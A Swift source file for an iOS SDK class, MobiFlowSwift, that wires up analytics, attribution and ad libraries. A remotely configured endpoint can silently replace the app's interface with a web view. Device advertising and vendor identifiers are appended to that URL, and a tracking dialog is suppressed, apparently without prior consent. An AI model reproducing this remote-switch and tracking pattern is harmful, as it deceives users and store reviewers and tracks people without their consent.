import UIKit
import Adjust
import AppTrackingTransparency
import AdSupport
import FirebaseCore
import FirebaseAnalytics
import FirebaseRemoteConfig
import OneSignal
import TikTokBusinessSDK
import StoreKit
import AdServices
import AppsFlyerLib

public class MobiFlowSwift: NSObject
{
    
    private let mob_sdk_version = "2.1.9"
    private var endpoint = ""
    private var oneSignalToken = ""
    private var launchOptions: [UIApplication.LaunchOptionsKey: Any]?
    public var customURL = ""
    public var schemeURL = ""
    public var addressURL = ""
    private var faid = ""
    private var adjustParams = "naming=$adjust_campaign_name&gps_adid=$idfa&adid=$adjust_id&idfv=$idfv&deeplink=$deeplink&firebase_instance_id=$firebase_instance_id&package=$package_id&click_id=$click_id&adjust_attribution=$adjust_attribution"
    private var appFlyerParams = "naming=$af_campaign_name_encoded&gps_adid=$idfa&adid=$idfa&afid=$appsflyer_id&idfv=$idfv&firebase_instance_id=$firebase_instance_id&package=$package_id&click_id=$click_id"
    private var run = false
    private var hasInitialized: Bool = false
    private var hasSwitchedToApp: Bool = false
    public var hideToolbar = false
    private var timer = Timer()
    public var delegate : MobiFlowDelegate? = nil
    private var backgroundColor = UIColor.white
    private var tintColor = UIColor.black
    
    //Adjust
    var rcAdjust : RCAdjust!
    
    //TikTok
    var rcTikTok : RCTikTok!
    
    //AppFlyers
    var rcAppsFlyers : RCAppsFlyers!
    
    //AppLovin
    private var appLovinManager = AppLovinManager.shared
    private var appLovinKey = ""
    private var interestialId = ""
    private var bannerId = ""
    
    let nc = NotificationCenter.default
    
    @objc public init(initDelegate: MobiFlowDelegate , oneSignalToken : String, appLovinKey: String, bannerId: String, interestialId: String, launchOptions: [UIApplication.LaunchOptionsKey: Any]?, isUnityApp: Bool) {
        super.init()
        
        self.delegate = initDelegate
        self.oneSignalToken = oneSignalToken
        self.launchOptions = launchOptions
        self.bannerId = bannerId
        self.interestialId = interestialId
        self.appLovinKey = appLovinKey
        
        self.getFirebase()
        self.initialiseAppLovin()
        
        //app enter foreground
        nc.addObserver(self, selector: #selector(appMovedToForeground), name: UIApplication.willEnterForegroundNotification, object: nil)
    }
    
    public init(initDelegate: MobiFlowDelegate , oneSignalToken : String, appLovinKey: String, bannerId: String, interestialId: String, launchOptions: [UIApplication.LaunchOptionsKey: Any]?  ) {
        super.init()
        
        self.delegate = initDelegate
        self.oneSignalToken = oneSignalToken
        self.launchOptions = launchOptions
        self.bannerId = bannerId
        self.interestialId = interestialId
        self.appLovinKey = appLovinKey
        
        self.getFirebase()
        self.initialiseAppLovin()
        
        //app enter foreground
        nc.addObserver(self, selector: #selector(appMovedToForeground), name: UIApplication.willEnterForegroundNotification, object: nil)
    }
    
    @objc func appMovedToForeground() {
        debugPrint("Mobibox: Will Enter Foreground")
        if self.hasSwitchedToApp && (self.endpoint == "") {
            self.appLovinManager.showInterestialAdWithoutCount { _ in
                
            }
        }
    }
    
    func getFirebase() {
        
        FirebaseApp.configure()
        
        let appDefaults: [String: Any?] = [
            "run": true,
        ]
        
        RemoteConfig.remoteConfig().setDefaults(appDefaults as? [String: NSObject])
        
        RemoteConfig.remoteConfig().fetch { (status, error) in
            if status == .success {
                RemoteConfig.remoteConfig().activate { _, error in
                    DispatchQueue.main.async {
                        
                        self.endpoint = RemoteConfig.remoteConfig()["sub_endios"].stringValue ?? ""
                        self.rcAdjust = RCValues.sharedInstance.getAdjust()
                        self.rcTikTok = RCValues.sharedInstance.getTikTok()
                        self.rcAppsFlyers = RCValues.sharedInstance.getAppsFlyers()
                        self.run = self.endpoint != ""
                        self.initialiseSDK()
                    }
                }
            } else {
                print("Config not fetched")
                print("Error: \(error?.localizedDescription ?? "No error available.")")
            }
        }
        
    }
    
    func initialiseSDK() {
        
        
        if hasInitialized {
            return
        }
        
        self.hasInitialized = true
        
        // Remove this method to stop OneSignal Debugging
        OneSignal.setLogLevel(.LL_VERBOSE, visualLevel: .LL_NONE)
        
        OneSignal.setLaunchURLsInApp(false); // before Initialize
        
        // OneSignal initialization
        OneSignal.initWithLaunchOptions(launchOptions)
        OneSignal.setAppId(oneSignalToken)
        
        self.faid = Analytics.appInstanceID() ?? ""
        
        if self.rcTikTok.enabled {
            
            let tiktokID = NSNumber(value:Int(rcTikTok.tiktokAppId) ?? 0)
            let config = TikTokConfig.init(accessToken: rcTikTok.accessToken, appId: rcTikTok.appStoreId, tiktokAppId: tiktokID)
            config?.appTrackingDialogSuppressed = true
            TikTokBusiness.initializeSdk(config)
            
            let tiktokCallbackProperties : [AnyHashable : Any] = [
                "m_sdk_ver" : mob_sdk_version,
                "user_uuid" : generateUserUUID(),
                "firebase_instance_id" : self.faid
            ]
            printMobLog(description: "tiktokCallbackProperties:", value: tiktokCallbackProperties.description)
            
            if (rcTikTok.eventName != "") {
                TikTokBusiness.trackEvent(rcTikTok.eventName, withProperties:tiktokCallbackProperties)
            }
        }
        
        if (!run) {
            DispatchQueue.main.asyncAfter(deadline: .now() + 3, execute: {
                self.appLovinManager.showInterestialAdWithoutCount { _ in
                    self.showNativeWithPermission(dic: [String : Any]())
                }
            })
            return
        }
        
        if (rcAppsFlyers.enabled) { //Init Apps Flyers SDK
            debugPrint("Apps Flyers SDK initiate called")
            
            AppsFlyerLib.shared().appsFlyerDevKey = rcAppsFlyers.devKey
            AppsFlyerLib.shared().appleAppID = rcAppsFlyers.appStoreId
            
#if DEBUG
            debugPrint("Not App Store build")
            //  Set isDebug to true to see AppsFlyer debug logs
            AppsFlyerLib.shared().isDebug = true
#else
            debugPrint("App Store build")
#endif
            
            AppsFlyerLib.shared().start(completionHandler: { (dictionary, error) in
                if (error != nil){
                    debugPrint(error ?? "")
                    return
                } else {
                    debugPrint("Apps Flyers SDK response dictionary: \(dictionary ?? [:])")
                    return
                }
            })
            
        } else if (rcAdjust.enabled){
            
            debugPrint("Adjust initiate called with token")
            
            let adjustConfig = ADJConfig(appToken: rcAdjust.appToken, environment: ADJEnvironmentProduction)
            
            adjustConfig?.sendInBackground = true
            adjustConfig?.linkMeEnabled = true
            
            Adjust.appDidLaunch(adjustConfig)
            
            Adjust.addSessionCallbackParameter("m_sdk_ver", value: mob_sdk_version)
            Adjust.addSessionCallbackParameter("user_uuid", value: generateUserUUID())
            // Adjust.addSessionCallbackParameter("firebase_instance_id", value: self.faid)
            
            self.onDataReceived()
            
        }
    }
    
    private func initialiseAppLovin(){
        self.appLovinManager.initializeAppLovin(appLovinKey: self.appLovinKey, interestialId: self.interestialId, bannerId: self.bannerId)
    }
    
    @objc public func showBannerAd(vc : UIViewController) {
        if (self.bannerId != ""){
            self.appLovinManager.loadBannerAd(vc: vc)
        }
    }
    
    @objc public func showInterestialAd(onClose : @escaping (Bool) -> ()) {
        if (self.interestialId != "") {
            self.appLovinManager.showInterestialAd(onClose: onClose)
        } else {
            onClose(false)
        }
    }
    
    @objc private func onDataReceived(){
        if (endpoint != "") {
            let packageName = Bundle.main.bundleIdentifier ?? ""
            let apiString = "\(endpoint.hasPrefix("http") ? endpoint : "https://" + endpoint)?package=\(packageName)"
            
            printMobLog(description: "fetch endpoint url", value: apiString)
            self.checkIfEndPointAvailable(endPoint: apiString)
        } else {
            self.appLovinManager.showInterestialAdWithoutCount { _ in
                self.showNativeWithPermission(dic: [:])
            }
        }
    }
    
    private func checkIfEndPointAvailable(endPoint: String) {
        
        if (endpoint == "") {
            printMobLog(description: "check If EndPoint Available", value: "")
            self.showNativeWithPermission(dic: [:])
        } else {
            self.endpoint = endpoint.hasPrefix("http") ? endpoint : "https://" + endpoint
            printMobLog(description: "check If EndPoint Available", value: self.endpoint)
            DispatchQueue.main.async {
                self.startApp()
            }
        }
        
    }
    
    func createParamsURL()
    {
        
        let adjustAttributes = Adjust.attribution()?.description ?? ""
        let encodedAdjustAttributes = adjustAttributes.addingPercentEncoding(withAllowedCharacters: .urlHostAllowed) ?? ""
        
        
        let idfa = ASIdentifierManager.shared().advertisingIdentifier.uuidString
        printMobLog(description:  "GPS_ADID", value: idfa)
        
        
        let idfv = UIDevice.current.identifierForVendor!.uuidString
        printMobLog(description: "Device ID", value: idfv)
        
        printMobLog(description: "self.AdjustParams before changing macro", value: self.adjustParams.description)
        printMobLog(description: "self.AppsFlyersParams before changing macro", value: self.appFlyerParams.description)
        
        var paramsQuery = ""
        if (rcAppsFlyers.enabled) {
            paramsQuery = self.appFlyerParams
                .replacingOccurrences(of: "$af_campaign_name_encoded", with: getAppFlyersCampanName())
                .replacingOccurrences(of: "$idfa", with: idfa)
                .replacingOccurrences(of: "$idfv", with: idfv)
                .replacingOccurrences(of: "$appsflyer_id", with: AppsFlyerLib.shared().getAppsFlyerUID())
                .replacingOccurrences(of: "$firebase_instance_id", with: self.faid)
                .replacingOccurrences(of: "$package_id", with: Bundle.main.bundleIdentifier ?? "")
                .replacingOccurrences(of: "$click_id", with: generateUserUUID())
        } else if (rcAdjust.enabled) {
            paramsQuery = self.adjustParams
                .replacingOccurrences(of: "$adjust_campaign_name", with: Adjust.attribution()?.campaign ?? "")
                .replacingOccurrences(of: "$idfa", with: idfa)
                .replacingOccurrences(of: "$idfv", with: idfv)
                .replacingOccurrences(of: "$adjust_id", with: Adjust.adid() ?? "")
                .replacingOccurrences(of: "$deeplink", with: "")
                .replacingOccurrences(of: "$firebase_instance_id", with: self.faid)
                .replacingOccurrences(of: "$package_id", with: Bundle.main.bundleIdentifier ?? "")
                .replacingOccurrences(of: "$click_id", with: generateUserUUID())
                .replacingOccurrences(of: "$adjust_attribution", with: encodedAdjustAttributes)
        }
        
        printMobLog(description: "self.adjustParams after changing macro", value: self.adjustParams.description)
        printMobLog(description: "self.AppsFlyersParams after changing macro", value: self.appFlyerParams.description)
        
        let customString =  self.endpoint + "/?"  + paramsQuery
        
        printMobLog(description: "create Params URL String", value: customString)
        
        self.customURL = customString
        
    }
    
    func initWebViewURL() -> WebViewController
    {
        let urlToOpen = URL(string: self.customURL)
        let frameworkBundle = Bundle(for: Self.self)
        let bundleURL = frameworkBundle.resourceURL?.appendingPathComponent("MobFlowiOS.bundle")
        let bundle = Bundle(url: bundleURL!)
        let storyBoard = UIStoryboard(name: "Main", bundle:bundle)
        let webView = storyBoard.instantiateViewController(withIdentifier: "WebViewController") as! WebViewController
        webView.urlToOpen = urlToOpen!
        webView.schemeURL = self.schemeURL
        webView.addressURL = self.addressURL
        webView.delegate = self
        webView.tintColor = self.tintColor
        webView.backgroundColor = self.backgroundColor
        webView.hideToolbar = self.hideToolbar
        
        return webView
    }
    
    
    func present(webView: WebViewController)
    {
        UIApplication.shared.windows.first?.rootViewController = webView
        UIApplication.shared.windows.first?.makeKeyAndVisible()
    }
    
    public func showNativeWithPermission(dic: [String : Any]) {
        printMobLog(description: "show Native With Permission", value: "")
        self.hasSwitchedToApp = true
        self.delegate?.present(dic: dic)
        requestPremission()
    }
}

extension MobiFlowSwift :  AppsFlyerLibDelegate {
    public func onConversionDataSuccess(_ conversionInfo: [AnyHashable : Any]) {
        
        if let campaign = conversionInfo["campaign"] as? String {
            debugPrint("AppsFlyers: onConversionDataSuccess: campaign: \(campaign)")
            let encodedCampain = campaign.utf8EncodedString()
            saveAppFlyersCampanName(encodedCampain)
        }
        
        if let status = conversionInfo["af_status"] as? String {
            if (status == "Non-organic") {
                // Business logic for Non-organic install scenario is invoked
                debugPrint("AppsFlyers: onConversionDataSuccess: Non-organic install")
            }
            else {
                // Business logic for organic install scenario is invoked
                debugPrint("AppsFlyers: onConversionDataSuccess: Organic install")
            }
        }
    }
    
    public func onConversionDataFail(_ error: Error) {
        // Logic for when conversion data resolution fails
        debugPrint("AppsFlyers: onConversionDataFail: error: \(error.localizedDescription)")
    }
    
}
